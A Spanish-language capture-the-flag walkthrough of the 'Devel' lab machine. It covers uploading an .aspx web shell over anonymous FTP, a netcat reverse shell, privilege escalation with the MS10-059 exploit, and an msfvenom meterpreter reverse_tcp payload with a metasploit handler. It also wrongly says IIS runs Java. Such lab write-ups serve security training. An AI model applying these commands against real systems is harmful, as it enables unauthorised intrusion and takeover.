Devel

Escaneando la máquina podemos ver como tenemos abierto el puerto 80 y 21. Al principio le di muchas vueltas al tema del puerto 80 ya que vi que era un sistema windows con el iis 7.5 el cual tenía ciertas vulnerabilidades.

Tras un buen rato de búsqueda, me doy cuenta que dentro de la conexión ftp anónima puedo subir archivos, los cuales podemos ver representados en la web, así que vamos a subir una consola con el formato .aspx ya que sabemos que iis funciona con java.

La subimos y nos cercioramos de que se pueda ver y efectivamente, se puede ver y ejecutar comandos.

En la línea de ejecución de comandos vamos a ejecutar el nc.exe que previamente nos habíamos copiado de antemano.

Este recurso nos lo compartimos con impacket y el recurso compartido a nivel de red con smb.

Nos ponemos en escucha en el puerto 443 y nos ejecutamos el nc.exe y ya estamos dentro.

Escalada de privilegios

Una vez dentro ejecuto un systeminfo para ver todo lo posible del sistema operativo.

Lo copio, lo pego en un archivo txt en mi sistema local para analizarlo con windows-exploit-suggester y me detecta varias formas de escalar privilegios.

El exploit que encuentro que me funciona es el siguiente: https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe y el nombre del exploit: MS10-059.

Este exploit nos pide que metamos nuestro sistema local y el puerto de escucha, ya que nos manda una consola interactiva como administradores. Decir que debemos transferirnos este .exe de la misma manera, por ftp o compartiendo el recurso por smb.

Una vez ejecutado nos manda una consola como administradores y ya podemos acceder a las flags.

Manera alternativa de obtener una reverse shell con metasploit

Cuando identificamos que podemos ver nuestro recurso subido por ftp en la página web, nos creamos una shell con msfvenom usando el siguiente comando: msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=miIp LPORT=443 una vez creado el payload y habiéndolo subido a la máquina por ftp, iniciamos metasploit.

Con el comando msfdb run actualizamos la base de datos a la par que iniciamos metasploit. Una vez dentro lo que vamos a hacer es usar un handler con el siguiente comando lo configuramos: use exploit/multi/handler y setteamos el payload con el siguiente comando: set payload windows/meterpreter/reverse_tcp. Con set LHOST y set LPORT ajustamos el puerto y nuestra ip y recargamos la página web y ya tenemos una sesión de meterpreter.
